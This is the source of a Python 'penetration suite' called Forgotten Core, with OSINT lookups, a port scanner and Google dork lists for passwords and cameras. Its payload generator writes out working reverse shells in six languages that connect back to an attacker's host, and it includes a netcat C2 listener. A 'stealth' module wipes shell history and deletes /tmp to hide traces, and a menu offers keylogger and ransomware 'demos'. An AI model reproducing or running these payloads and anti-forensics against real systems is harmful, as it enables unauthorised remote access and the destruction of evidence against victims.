#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════
# FORGOTTEN CORE v2.0 - Architect 02 Penetration Suite
# "What is buried shall remain buried. What is forgotten shall rise."
# Full Version - 20+ Modules | Termux Compatible | No Root Required
# ═══════════════════════════════════════════════════════════════════════

import os
import sys
import time
import hashlib
import subprocess
import socket
import base64
import random
import string
import re
import json
import threading
from datetime import datetime

# Check for optional imports
try:
    import requests
except:
    os.system("pip install requests")
    import requests

try:
    from cryptography.fernet import Fernet
except:
    os.system("pip install cryptography")
    from cryptography.fernet import Fernet

# ============================================================
# COLOR CODES
# ============================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DARK = '\033[90m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

# ============================================================
# MAIN CORE CLASS
# ============================================================

class ForgottenCore:
    def __init__(self):
        self.version = "2.0"
        self.codename = "Echoes of the Void"
        self.user = "forgotten"
        self.host = "void"
        self.void_dir = os.path.expanduser("~/.forgotten_core")
        self.payload_dir = f"{self.void_dir}/payloads"
        self.osint_dir = f"{self.void_dir}/osint"
        self.scan_dir = f"{self.void_dir}/scans"
        for d in [self.void_dir, self.payload_dir, self.osint_dir, self.scan_dir]:
            os.makedirs(d, exist_ok=True)
    
    def get_path(self):
        p = os.getcwd().replace(os.path.expanduser("~"), "~")
        return p
    
    def prompt(self):
        path = self.get_path()
        return f"{Colors.RED}{Colors.BOLD}┌──({Colors.RED}{self.user}@{Colors.RED}{self.host}{Colors.RED})-{Colors.RED}[{path}]{Colors.RED}\n└─{Colors.WHITE}${Colors.END} "
    
    def clear(self):
        os.system("clear")
        self.banner()
    
    def banner(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║  ███████╗ ██████╗ ██████╗  ██████╗ ████████╗████████╗███████╗███╗   ██╗    ║
║  ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝╚══██╔══╝██╔════╝████╗  ██║    ║
║  █████╗  ██║   ██║██████╔╝██║   ██║   ██║      ██║   █████╗  ██╔██╗ ██║    ║
║  ██╔══╝  ██║   ██║██╔══██╗██║   ██║   ██║      ██║   ██╔══╝  ██║╚██╗██║    ║
║  ██║     ╚██████╔╝██║  ██║╚██████╔╝   ██║      ██║   ███████╗██║ ╚████║    ║
║  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═══╝    ║
║                         ██████╗ ██████╗ ██████╗ ███████╗                 ║
║                        ██╔════╝██╔═══██╗██╔══██╗██╔════╝                 ║
║                        ██║     ██║   ██║██████╔╝█████╗                   ║
║                        ██║     ██║   ██║██╔══██╗██╔══╝                   ║
║                        ╚██████╗╚██████╔╝██║  ██║███████╗                 ║
║                         ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝                 ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.PURPLE}{Colors.BOLD}                    FORGOTTEN CORE v{self.version} - {self.codename}{Colors.END}
{Colors.DARK}{Colors.DIM}               "What is buried shall remain buried. What is forgotten shall rise."{Colors.END}
        """
        print(banner)
    
    def show_menu(self):
        menu = f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
║                         MAIN MENU                                                 ║
╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}

{Colors.GREEN}[01]{Colors.WHITE} phone / tel    {Colors.DARK}» Phone number OSINT{Colors.END}
{Colors.GREEN}[02]{Colors.WHITE} ip / geo       {Colors.DARK}» IP geolocation tracker{Colors.END}
{Colors.GREEN}[03]{Colors.WHITE} username / user{Colors.DARK}» Check username on social media{Colors.END}
{Colors.GREEN}[04]{Colors.WHITE} subdomain / sub{Colors.DARK}» Subdomain scanner{Colors.END}
{Colors.GREEN}[05]{Colors.WHITE} port / scan    {Colors.DARK}» Fast TCP port scanner{Colors.END}
{Colors.GREEN}[06]{Colors.WHITE} dork / google  {Colors.DARK}» Google dork generator{Colors.END}
{Colors.GREEN}[07]{Colors.WHITE} email / mail   {Colors.DARK}» Email OSINT lookup{Colors.END}
{Colors.GREEN}[08]{Colors.WHITE} whois          {Colors.DARK}» WHOIS domain lookup{Colors.END}
{Colors.GREEN}[09]{Colors.WHITE} dns            {Colors.DARK}» DNS records lookup{Colors.END}
{Colors.GREEN}[10]{Colors.WHITE} payload / p    {Colors.DARK}» Generate reverse shell payload{Colors.END}
{Colors.GREEN}[11]{Colors.WHITE} c2 / server    {Colors.DARK}» Start C2 / listener server{Colors.END}
{Colors.GREEN}[12]{Colors.WHITE} stealth / s    {Colors.DARK}» Clean traces and logs{Colors.END}
{Colors.GREEN}[13]{Colors.WHITE} anon / a       {Colors.DARK}» Anonymity (Tor network){Colors.END}
{Colors.GREEN}[14]{Colors.WHITE} crypt / encrypt{Colors.DARK}» AES file encryption/decryption{Colors.END}
{Colors.GREEN}[15]{Colors.WHITE} hash           {Colors.DARK}» Hash generator (MD5, SHA1, SHA256){Colors.END}
{Colors.GREEN}[16]{Colors.WHITE} encode         {Colors.DARK}» Base64/URL encoder decoder{Colors.END}
{Colors.GREEN}[17]{Colors.WHITE} passgen / pg   {Colors.DARK}» Random password generator{Colors.END}
{Colors.GREEN}[18]{Colors.WHITE} malware / mw   {Colors.DARK}» Educational malware generator{Colors.END}
{Colors.GREEN}[19]{Colors.WHITE} clear / cls    {Colors.DARK}» Clear screen{Colors.END}
{Colors.GREEN}[20]{Colors.WHITE} help / ?       {Colors.DARK}» Show this menu{Colors.END}
{Colors.GREEN}[00]{Colors.WHITE} exit / quit    {Colors.DARK}» Exit Forgotten Core{Colors.END}

{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}
        """
        print(menu)
    
    # ==================== OSINT MODULES ====================
    
    def phone_osint(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    PHONE OSINT MODULE                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        raw = input(f"{self.prompt()}phone number > ").strip()
        clean = re.sub(r'[^0-9+]', '', raw)
        
        if clean.startswith('0'):
            num = '+62' + clean[1:]
        elif clean.startswith('62') and not clean.startswith('+'):
            num = '+' + clean
        elif not clean.startswith('+'):
            num = '+62' + clean
        else:
            num = clean
        
        # Indonesian carrier database
        prefixes = {
            '811': 'Telkomsel', '812': 'Telkomsel', '813': 'Telkomsel',
            '814': 'Indosat', '815': 'Indosat', '816': 'Indosat',
            '817': 'XL Axiata', '818': 'XL Axiata', '819': 'XL Axiata',
            '821': 'Telkomsel', '822': 'Telkomsel', '823': 'Telkomsel',
            '831': 'Axis', '832': 'Axis', '833': 'Axis',
            '896': 'Tri', '897': 'Tri', '898': 'Tri', '899': 'Tri'
        }
        
        part = num.replace('+62', '')
        pref = part[:3] if len(part) >= 3 else part
        
        print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
        print(f"{Colors.BOLD}📱 PHONE OSINT RESULTS{Colors.END}")
        print(f"{Colors.GREEN}{'='*55}{Colors.END}\n")
        print(f"{Colors.CYAN}Number     :{Colors.WHITE} {num}")
        if pref in prefixes:
            print(f"{Colors.CYAN}Carrier    :{Colors.GREEN} {prefixes[pref]}{Colors.END}")
        print(f"{Colors.CYAN}Length     :{Colors.WHITE} {len(part)} digits")
        
        print(f"\n{Colors.YELLOW}[*] OSINT Links:{Colors.END}")
        print(f"    WhatsApp  : https://wa.me/{num}")
        print(f"    Telegram  : https://t.me/+{num[1:]}")
        print(f"    Google    : https://www.google.com/search?q={num}")
        
        filename = f"{self.osint_dir}/phone_{num.replace('+','')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Phone: {num}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    def ip_tracker(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    IP TRACKER MODULE                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        target = input(f"{self.prompt()}IP address > ")
        
        try:
            r = requests.get(f"http://ip-api.com/json/{target}", timeout=10)
            data = r.json()
            if data.get('status') == 'success':
                print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
                print(f"{Colors.BOLD}🌍 IP GEOLOCATION RESULTS{Colors.END}")
                print(f"{Colors.GREEN}{'='*55}{Colors.END}\n")
                print(f"{Colors.CYAN}IP Address :{Colors.WHITE} {data.get('query')}")
                print(f"{Colors.CYAN}Country    :{Colors.WHITE} {data.get('country')} ({data.get('countryCode')})")
                print(f"{Colors.CYAN}Region     :{Colors.WHITE} {data.get('regionName')}")
                print(f"{Colors.CYAN}City       :{Colors.WHITE} {data.get('city')}")
                print(f"{Colors.CYAN}ISP        :{Colors.WHITE} {data.get('isp')}")
                print(f"\n{Colors.YELLOW}[*] Google Maps: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}{Colors.END}")
                
                filename = f"{self.osint_dir}/ip_{target}.txt"
                with open(filename, 'w') as f:
                    f.write(json.dumps(data, indent=2))
                print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] IP not found{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
    
    def username_check(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    USERNAME OSINT MODULE                             ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        username = input(f"{self.prompt()}username > ")
        
        sites = {
            "Instagram": f"https://instagram.com/{username}",
            "Twitter": f"https://twitter.com/{username}",
            "GitHub": f"https://github.com/{username}",
            "Reddit": f"https://reddit.com/user/{username}",
            "TikTok": f"https://tiktok.com/@{username}",
            "YouTube": f"https://youtube.com/@{username}",
            "Telegram": f"https://t.me/{username}",
            "Facebook": f"https://facebook.com/{username}"
        }
        
        print(f"\n{Colors.CYAN}[*] Checking username: {username}{Colors.END}\n")
        
        found = []
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    print(f"{Colors.GREEN}[✓] {site}: {url}{Colors.END}")
                    found.append(site)
                else:
                    print(f"{Colors.DARK}[✗] {site}: not found{Colors.END}")
            except:
                print(f"{Colors.DARK}[?] {site}: error{Colors.END}")
            time.sleep(0.2)
        
        filename = f"{self.osint_dir}/username_{username}.txt"
        with open(filename, 'w') as f:
            f.write(f"Username: {username}\nFound on: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} profiles. Saved to: {filename}{Colors.END}")
    
    def subdomain_scan(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    SUBDOMAIN SCANNER                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        domain = input(f"{self.prompt()}domain > ")
        
        subdomains = [
            "www", "mail", "ftp", "blog", "dev", "test", "admin", "api", "app",
            "portal", "login", "dashboard", "cdn", "assets", "static", "docs",
            "support", "help", "status", "info", "news", "shop", "store"
        ]
        
        print(f"{Colors.CYAN}[*] Scanning {domain}{Colors.END}\n")
        
        found = []
        for sub in subdomains:
            test = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(test)
                print(f"{Colors.GREEN}[✓] {test} -> {ip}{Colors.END}")
                found.append(test)
            except:
                print(f"{Colors.DARK}[✗] {test}{Colors.END}")
            time.sleep(0.05)
        
        filename = f"{self.scan_dir}/subdomains_{domain}.txt"
        with open(filename, 'w') as f:
            f.write(f"Domain: {domain}\nFound: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} subdomains. Saved to: {filename}{Colors.END}")
    
    def port_scanner(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    PORT SCANNER MODULE                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        target = input(f"{self.prompt()}target IP/Domain > ")
        ports_input = input(f"{self.prompt()}ports (1-1000 or 80,443) > ") or "1-1000"
        
        if '-' in ports_input:
            start, end = map(int, ports_input.split('-'))
            port_range = range(start, end+1)
        else:
            port_range = [int(p.strip()) for p in ports_input.split(',')]
        
        print(f"{Colors.CYAN}[*] Scanning {target}...{Colors.END}\n")
        
        open_ports = []
        total = len(port_range)
        count = 0
        
        for port in port_range:
            count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, port)) == 0:
                print(f"{Colors.GREEN}[+] Port {port}: OPEN{Colors.END}")
                open_ports.append(port)
            sock.close()
            
            if count % 100 == 0:
                print(f"{Colors.DARK}[*] Progress: {count}/{total}{Colors.END}")
        
        filename = f"{self.scan_dir}/ports_{target}.txt"
        with open(filename, 'w') as f:
            f.write(f"Target: {target}\nOpen ports: {open_ports}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(open_ports)} open ports. Saved to: {filename}{Colors.END}")
    
    def dork_generator(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    GOOGLE DORK GENERATOR                             ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        dorks = {
            '1': ('Login Pages', ['inurl:login', 'inurl:admin', 'inurl:wp-admin', 'intitle:"login page"']),
            '2': ('Sensitive Files', ['ext:conf', 'ext:config', 'ext:sql', 'ext:db', 'ext:bak']),
            '3': ('Exposed Data', ['inurl:phpinfo.php', 'intitle:"index of"', 'inurl:dump.sql']),
            '4': ('Passwords', ['ext:passwd', 'ext:pwd', 'intext:"password" filetype:txt']),
            '5': ('Cameras', ['inurl:view/view.shtml', 'inurl:axis-cgi/jpg', 'intitle:"Live View"'])
        }
        
        print(f"{Colors.CYAN}Categories:{Colors.END}")
        for key, (name, _) in dorks.items():
            print(f"{Colors.GREEN}[{key}]{Colors.WHITE} {name}{Colors.END}")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Custom dork{Colors.END}")
        
        choice = input(self.prompt())
        
        if choice == '0':
            dork = input(f"{self.prompt()}custom dork > ")
            print(f"\n{Colors.GREEN}[+] https://www.google.com/search?q={dork.replace(' ', '+')}{Colors.END}")
        elif choice in dorks:
            name, dork_list = dorks[choice]
            print(f"\n{Colors.GREEN}[+] {name} Dorks:{Colors.END}")
            for dork in dork_list:
                print(f"{Colors.CYAN}    {dork}{Colors.END}")
                print(f"    https://www.google.com/search?q={dork.replace(' ', '+')}\n")
        
        filename = f"{self.osint_dir}/dorks.txt"
        with open(filename, 'w') as f:
            f.write(f"Dorks generated at {datetime.now()}\n")
            for key, (name, dork_list) in dorks.items():
                f.write(f"\n=== {name} ===\n")
                for dork in dork_list:
                    f.write(f"{dork}\n")
        print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    def email_osint(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    EMAIL OSINT MODULE                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        email = input(f"{self.prompt()}email address > ")
        
        if '@' not in email:
            print(f"{Colors.RED}[!] Invalid email format{Colors.END}")
            return
        
        domain = email.split('@')[1]
        username = email.split('@')[0]
        
        print(f"\n{Colors.GREEN}[+] Domain: {domain}{Colors.END}")
        print(f"{Colors.GREEN}[+] Username: {username}{Colors.END}")
        
        print(f"\n{Colors.YELLOW}[*] OSINT Links:{Colors.END}")
        print(f"    HaveIBeenPwned: https://haveibeenpwned.com/account/{email}")
        print(f"    Google: https://www.google.com/search?q={email}")
        print(f"    Dehashed: https://dehashed.com/search?query={email}")
        
        filename = f"{self.osint_dir}/email_{username}.txt"
        with open(filename, 'w') as f:
            f.write(f"Email: {email}\nDomain: {domain}\nTime: {datetime.now()}\n")
        print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    def whois_lookup(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    WHOIS LOOKUP MODULE                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        domain = input(f"{self.prompt()}domain > ")
        
        try:
            import whois
            w = whois.whois(domain)
            print(f"\n{Colors.GREEN}[+] WHOIS Results:{Colors.END}")
            print(f"    Domain: {w.domain_name}")
            print(f"    Registrar: {w.registrar}")
            print(f"    Creation Date: {w.creation_date}")
            print(f"    Expiration Date: {w.expiration_date}")
            print(f"    Name Servers: {w.name_servers}")
            
            filename = f"{self.osint_dir}/whois_{domain}.txt"
            with open(filename, 'w') as f:
                f.write(str(w))
            print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] WHOIS lookup failed{Colors.END}")
            os.system(f"whois {domain}")
    
    def dns_lookup(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    DNS LOOKUP MODULE                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        domain = input(f"{self.prompt()}domain > ")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        print(f"\n{Colors.CYAN}[*] Looking up {domain}{Colors.END}\n")
        
        for rtype in record_types:
            try:
                import dns.resolver
                answers = dns.resolver.resolve(domain, rtype)
                print(f"{Colors.GREEN}[+] {rtype} Records:{Colors.END}")
                for ans in answers:
                    print(f"    {ans}")
            except:
                print(f"{Colors.DARK}[!] No {rtype} records{Colors.END}")
    
    # ==================== ATTACK MODULES ====================
    
    def generate_payload(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    PAYLOAD GENERATOR                                  ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Python Reverse Shell")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Bash Reverse Shell")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} PowerShell Reverse Shell")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} PHP Reverse Shell")
        print(f"{Colors.GREEN}[5]{Colors.WHITE} Perl Reverse Shell")
        print(f"{Colors.GREEN}[6]{Colors.WHITE} Ruby Reverse Shell")
        print(f"{Colors.GREEN}[7]{Colors.WHITE} Back")
        
        choice = input(self.prompt())
        
        if choice == '7':
            return
        
        lhost = input(f"{self.prompt()}LHOST > ")
        lport = input(f"{self.prompt()}LPORT > ")
        
        payloads = {
            '1': f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            '2': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            '3': f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()''',
            '4': f'''<?php
set_time_limit(0);
$ip='{lhost}';
$port={lport};
$fp=fsockopen($ip,$port,$errno,$errstr);
if(!$fp){{die();}}
while(!feof($fp)){{
    $cmd=fgets($fp,1024);
    $output=shell_exec($cmd);
    fwrite($fp,$output);
}}
fclose($fp);
?>''',
            '5': f'''#!/usr/bin/perl
use Socket;
$i="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}}''',
            '6': f'''#!/usr/bin/ruby
require 'socket'
c=TCPSocket.new("{lhost}",{lport})
while(cmd=c.gets)
    IO.popen(cmd,"r"){{|io|c.print io.read}}
end''',
        }
        
        ext = {'1': 'py', '2': 'sh', '3': 'ps1', '4': 'php', '5': 'pl', '6': 'rb'}
        lang = {'1': 'Python', '2': 'Bash', '3': 'PowerShell', '4': 'PHP', '5': 'Perl', '6': 'Ruby'}
        
        payload = payloads.get(choice, payloads['1'])
        filename = f"{self.payload_dir}/payload_{lang[choice]}_{int(time.time())}.{ext[choice]}"
        
        with open(filename, 'w') as f:
            f.write(payload)
        
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Type: {lang[choice]} Reverse Shell{Colors.END}")
        print(f"{Colors.CYAN}[*] LHOST: {lhost} | LPORT: {lport}{Colors.END}")
    
    def start_c2(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    C2 / LISTENER SERVER                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} HTTP Server (python)")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Netcat Listener")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Back")
        
        choice = input(self.prompt())
        
        if choice == '1':
            port = input(f"{self.prompt()}port (80) > ") or "80"
            print(f"{Colors.CYAN}[*] Starting HTTP server on port {port}{Colors.END}")
            os.system(f"python3 -m http.server {port}")
        elif choice == '2':
            port = input(f"{self.prompt()}port (4444) > ") or "4444"
            print(f"{Colors.CYAN}[*] Starting netcat listener on port {port}{Colors.END}")
            os.system(f"nc -lvnp {port}")
    
    def stealth_clean(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    STEALTH CLEANER                                     ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Wipe Bash/Zsh History")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Clear Logs")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Full Forensic Cleanup")
        
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("echo > ~/.zsh_history")
            print(f"{Colors.GREEN}[+] Shell history wiped{Colors.END}")
        elif choice == '2':
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"{Colors.GREEN}[+] Temp files cleared{Colors.END}")
        elif choice == '3':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"{Colors.GREEN}[+] Full forensic cleanup complete{Colors.END}")
    
    def anonymity(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    VOID ANONYMITY MODULE                             ║
║              "Vanish without a trace"                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Start Tor")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Check Current IP")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Anonymized IP (Tor)")
        
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("tor &")
            print(f"{Colors.GREEN}[+] Tor started on port 9050{Colors.END}")
        elif choice == '2':
            print(f"{Colors.CYAN}[*] Current IP:{Colors.END}")
            os.system("curl -s ifconfig.me")
            print()
        elif choice == '3':
            print(f"{Colors.CYAN}[*] Anonymized IP (Tor):{Colors.END}")
            os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
            print()
    
    # ==================== UTILITY MODULES ====================
    
    def file_crypt(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    FILE ENCRYPTION                                    ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Encrypt file")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Decrypt file")
        
        choice = input(self.prompt())
        
        if choice == '1':
            filepath = input(f"{self.prompt()}file to encrypt > ")
            if os.path.exists(filepath):
                key = Fernet.generate_key()
                cipher = Fernet(key)
                with open(filepath, 'rb') as f:
                    data = f.read()
                encrypted = cipher.encrypt(data)
                with open(filepath + '.enc', 'wb') as f:
                    f.write(encrypted)
                with open(filepath + '.key', 'wb') as f:
                    f.write(key)
                print(f"{Colors.GREEN}[+] Encrypted: {filepath}.enc{Colors.END}")
                print(f"{Colors.GREEN}[+] Key saved: {filepath}.key{Colors.END}")
            else:
                print(f"{Colors.RED}[!] File not found{Colors.END}")
        elif choice == '2':
            encfile = input(f"{self.prompt()}encrypted file > ")
            keyfile = input(f"{self.prompt()}key file > ")
            if os.path.exists(encfile) and os.path.exists(keyfile):
                with open(keyfile, 'rb') as f:
                    key = f.read()
                cipher = Fernet(key)
                with open(encfile, 'rb') as f:
                    data = f.read()
                decrypted = cipher.decrypt(data)
                outfile = encfile.replace('.enc', '.dec')
                with open(outfile, 'wb') as f:
                    f.write(decrypted)
                print(f"{Colors.GREEN}[+] Decrypted: {outfile}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Files not found{Colors.END}")
    
    def hash_generator(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    HASH GENERATOR                                     ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        text = input(f"{self.prompt()}text to hash > ")
        
        print(f"\n{Colors.GREEN}[+] Hashes:{Colors.END}")
        print(f"    MD5    : {hashlib.md5(text.encode()).hexdigest()}")
        print(f"    SHA1   : {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"    SHA256 : {hashlib.sha256(text.encode()).hexdigest()}")
        print(f"    SHA512 : {hashlib.sha512(text.encode()).hexdigest()}")
    
    def encode_decode(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    ENCODE/DECODE MODULE                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Base64 Encode")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Base64 Decode")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} URL Encode")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} URL Decode")
        
        choice = input(self.prompt())
        text = input(f"{self.prompt()}text > ")
        
        if choice == '1':
            encoded = base64.b64encode(text.encode()).decode()
            print(f"{Colors.GREEN}[+] Base64: {encoded}{Colors.END}")
        elif choice == '2':
            try:
                decoded = base64.b64decode(text).decode()
                print(f"{Colors.GREEN}[+] Decoded: {decoded}{Colors.END}")
            except:
                print(f"{Colors.RED}[!] Invalid Base64{Colors.END}")
        elif choice == '3':
            encoded = requests.utils.quote(text)
            print(f"{Colors.GREEN}[+] URL Encoded: {encoded}{Colors.END}")
        elif choice == '4':
            decoded = requests.utils.unquote(text)
            print(f"{Colors.GREEN}[+] URL Decoded: {decoded}{Colors.END}")
    
    def password_generator(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    PASSWORD GENERATOR                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        length = int(input(f"{self.prompt()}length (12) > ") or "12")
        count = int(input(f"{self.prompt()}count (5) > ") or "5")
        
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        
        print(f"\n{Colors.GREEN}[+] Generated passwords:{Colors.END}")
        for i in range(count):
            pwd = ''.join(random.choice(chars) for _ in range(length))
            print(f"    {i+1}. {pwd}")
        
        filename = f"{self.payload_dir}/passwords.txt"
        with open(filename, 'a') as f:
            f.write(f"\n--- {datetime.now()} ---\n")
            for i in range(count):
                f.write(f"{i+1}. {''.join(random.choice(chars) for _ in range(length))}\n")
        print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    # ==================== EDUCATIONAL MALWARE ====================
    
    def educational_malware(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║              EDUCATIONAL MALWARE GENERATOR                          ║
║              FOR RESEARCH / TESTING ONLY                            ║
║              RUNS ONLY IN SANDBOX DIRECTORY                         ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.YELLOW}[!] WARNING: For educational purposes only!{Colors.END}")
        confirm = input(f"{self.prompt()}I understand (y/n) > ")
        
        if confirm.lower() != 'y':
            return
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Reverse Shell (Educational)")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Keylogger Demo")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Ransomware Demo")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} Back")
        
        choice = input(self.prompt())
        
        if choice == '1':
            self.edu_reverse_shell()
        elif choice == '2':
            self.edu_keylogger()
        elif choice == '3':
            self.edu_ransomware()
    
